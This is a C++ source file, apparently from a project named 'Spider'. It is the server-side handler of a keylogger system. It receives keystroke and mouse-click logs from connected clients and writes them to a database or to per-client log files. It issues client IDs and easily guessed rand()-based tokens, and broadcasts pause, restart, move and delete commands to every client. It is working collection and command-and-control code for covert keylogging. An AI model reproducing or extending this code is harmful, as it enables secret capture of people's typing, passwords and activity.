
#include <boost/asio.hpp>
#include <boost/lexical_cast.hpp>
#include <iostream>
#include <cstdlib>
#include <fstream>
#include <sstream>
#include "Application.hh"
#include "Client.hh"
#include "MagicHeader.hh"
#include "TcpClient.hh"
#include "Config.hh"

namespace	Spider
{
  Client::Client(TcpClient* tcpClient, Application& app)
    : _tcpClient(tcpClient),
      _app(app)
  {
    _idClient = -1;
    _tcpClient->setTimeout(5);
    _getPong = true;
    srand(time(NULL));
    _functions[LOG] = &Client::manageLogType;
    _functions[ID] = &Client::manageIdType;
    _functions[RESP_KO] = &Client::manageRespKoType;
    _functions[RESP_OK] = &Client::manageRespOkType;
    _functions[PAUSE] = &Client::managePauseType;
    _functions[RESTART] = &Client::manageRestartType;
    _functions[MOVE] = &Client::manageMoveType;
    _functions[DELETE] = &Client::manageDeleteType;
    _functions[PING] = &Client::managePingType;
    _functions[PONG] = &Client::managePongType;
  }

  Client::~Client()
  {

  }

  void	Client::send(char* data, size_t size)
  {
    _tcpClient->deliver(data, size);
  }

  void	Client::onClientStart()
  {
    MagicHeader	magicHeader;
    char*	tmp;

    magicHeader.setName(_app.getConfig().getProtocolName());
    magicHeader.setMagicNb(_app.getConfig().getProtocolMagicNumber());
    magicHeader.setVersion(_app.getConfig().getProtocolVersion());
    magicHeader.setSubversion(_app.getConfig().getProtocolSubversion());
    tmp = magicHeader.getData();
    _tcpClient->deliver(tmp, magicHeader.getLength());
    delete [] tmp;
  }

  void	  Client::onMessageRead(char* data, size_t size)
  {
    if (size == _actualHeader.getLength()) /* si c'est un header */
      {
	_actualHeader.setData(data); /* je set le current header */
	if (_actualHeader.getType() == LOG) /* si c'est un type log */
	  {
	    _tcpClient->read(data, _actualLog.getLength()); /* je lis le prochain log */
	  }
	else
	  {
	    if (_actualHeader.getType() > 10)
	      manageOtherType();
	    else
	      (this->*_functions[_actualHeader.getType()])();
	    _tcpClient->read(data, _actualHeader.getLength()); /* je lis le prochain header */
	  }
      }
    else if (size == _actualLog.getLength()) /* si c'est un log */
      {
	_actualLog.setData(data); /* je set le current log */
	manageLogType(); /* je gere ce log */
	_tcpClient->read(data, _actualHeader.getLength()); /* je lis le prochain header */
      }
    else
      {
	manageOtherType();
	_tcpClient->read(data, _actualHeader.getLength()); /* je lis le prochain header */
      }
  }

  void	Client::onTimeoutExpired()
  {
    Header	resp;
    char*	tmp;

    if (_getPong == false)
      _tcpClient->close();
    _getPong = false;
    resp.setType(PING);
    resp.setIdClient(0);
    resp.setTokenId(0);
    resp.setMsgId(424242);
    resp.setSize(0);
    tmp = resp.getData();
    _tcpClient->deliver(tmp, _actualHeader.getLength());
    delete [] tmp;
  }

  /* management methods */

  void	Client::manageLogType()
  {
    Header		resp;
    std::ofstream	file;
    std::string		str1;
    std::string		str2;
    std::stringstream	str;
    char		*tmp;


    if ((_app.getManageDB().addLog(_actualHeader, _actualLog)) == false)
      {
	str1 = boost::lexical_cast<std::string>(_actualHeader.getIdClient());
	str2 = boost::lexical_cast<std::string>(_actualHeader.getTokenId());
	str << "logs/" << str1 << "." << str2;
	std::cout << str.str() << std::endl;
	file.open(str.str(), std::ios::out | std::ios::app);

	resp.setType(RESP_OK);
	if (!file.fail())
	  {
	    file << "Au temps " << _actualLog.getTime();
	    if (_actualLog.getInput() == KEYSTROKE)
	      {
		if (_actualLog.getState() == RELEASE)
		  file << " il a relaché";
		else if (_actualLog.getState() == PUSH)
		  file << " il a pressé";
		file << " la touche " << _actualLog.getValue();
	      }
	    else if (_actualLog.getInput() == MOUSE && _actualLog.getValue() != "MOVE")
	      {
		file << " clique";
		if (_actualLog.getValue() == "LEFT")
		  file << " gauche";
		else if (_actualLog.getValue() == "RIGHT")
		  file << " droit";
		file << "aux coordonnées (" << _actualLog.getCoord().getX() << ", " << _actualLog.getCoord().getY() << ")";
	      }
	    file << std::endl;
	    file.close();
	  }
	else
	  {
	    std::cerr << "error ouverture" << std::endl;
	    resp.setType(RESP_KO);
	  }
      }
    else
      resp.setType(RESP_OK);

    // std::cout << "\n#################################\n"
    // 	      << "time : " << _actualLog.getTime() << "\n"
    // 	      << "input : " << _actualLog.getInput() << "\n"
    // 	      << "state : " << _actualLog.getState() << "\n"
    // 	      << "value : " << _actualLog.getValue() << "\n"
    // 	      << "coord : x->" << _actualLog.getCoord().getX() << " y->" << _actualLog.getCoord().getY() << std::endl;

    resp.setIdClient(0);
    resp.setTokenId(0);
    resp.setMsgId(_actualHeader.getMsgId());
    resp.setSize(0);
    tmp = resp.getData();
    _tcpClient->deliver(tmp, _actualHeader.getLength());
    delete [] tmp;
  }

  void	Client::manageIdType()
  {
    int32_t	id = _actualHeader.getIdClient();
    uint32_t	token = _actualHeader.getTokenId();
    Header	resp;
    char*	tmp;

    resp.setType(ID);
    if (id > 0 && this->isValidKeyAndToken())
      {
	_idClient = id;
	resp.setIdClient(id);
	resp.setTokenId(token);
      }
    else
      {
	resp.setIdClient(this->generateUniqueId());
	resp.setTokenId(this->generateRandomToken());
	_app.getConfig().addUser(resp.getIdClient(), resp.getTokenId());
      }
    resp.setMsgId(_actualHeader.getMsgId());
    resp.setSize(0);
    tmp = resp.getData();
    _tcpClient->deliver(tmp, resp.getLength());
    delete [] tmp;
  }

  void	Client::manageRespKoType()
  {
  }

  void	Client::manageRespOkType()
  {
  }

  void	Client::managePauseType()
  {
    Header	resp;
    char	*tmp;

    std::cout << "PAUSE" << std::endl;
    resp.setType(PAUSE);
    resp.setIdClient(0);
    resp.setTokenId(0);
    resp.setMsgId(0);
    resp.setSize(0);
    tmp = resp.getData();
    _app.broadcast(tmp, resp.getLength());
    delete [] tmp;
  }

  void	Client::manageRestartType()
  {
    Header	resp;
    char	*tmp;

    std::cout << "START" << std::endl;
    resp.setType(RESTART);
    resp.setIdClient(0);
    resp.setTokenId(0);
    resp.setMsgId(0);
    resp.setSize(0);
    tmp = resp.getData();
    _app.broadcast(tmp, resp.getLength());    
    delete [] tmp;
  }

  void	Client::manageMoveType()
  {
    Header	resp;
    char*	tmp;

    resp.setType(MOVE);
    resp.setIdClient(0);
    resp.setTokenId(0);
    resp.setMsgId(0);
    resp.setSize(0);
    tmp = resp.getData();
    _app.broadcast(tmp, resp.getLength());    
    delete [] tmp;
  }

  void	Client::manageDeleteType()
  {
    Header	resp;
    char*	tmp;

    resp.setType(DELETE);
    resp.setIdClient(0);
    resp.setTokenId(0);
    resp.setMsgId(0);
    resp.setSize(0);
    tmp = resp.getData();
    _app.broadcast(tmp, resp.getLength());    
    delete [] tmp;
  }

  void	Client::managePingType()
  {
  }
  
  void	Client::managePongType()
  {
    _getPong = true;
  }

  void	Client::manageOtherType()
  {
    Header	resp;
    char*	tmp;

    resp.setType(RESP_KO);
    resp.setIdClient(0);
    resp.setTokenId(0);
    resp.setMsgId(_actualHeader.getMsgId());
    resp.setSize(0);
    tmp = resp.getData();
    _app.broadcast(tmp, resp.getLength());    
    delete [] tmp;
  }

  bool	Client::isValidKeyAndToken()
  {
    if (_idClient != _actualHeader.getIdClient() || _app.getConfig().getTokenById(_idClient) != _actualHeader.getTokenId())
      return (false);
    return (true);
  }

  int32_t	Client::generateUniqueId()
  {
    int32_t	id = 1;

    while (_app.getConfig().isIdDefined(id))
      id++;
    return (id);
  }

  uint32_t	Client::generateRandomToken()
  {
    return (rand() % 4000000000 + 1);
  }
}
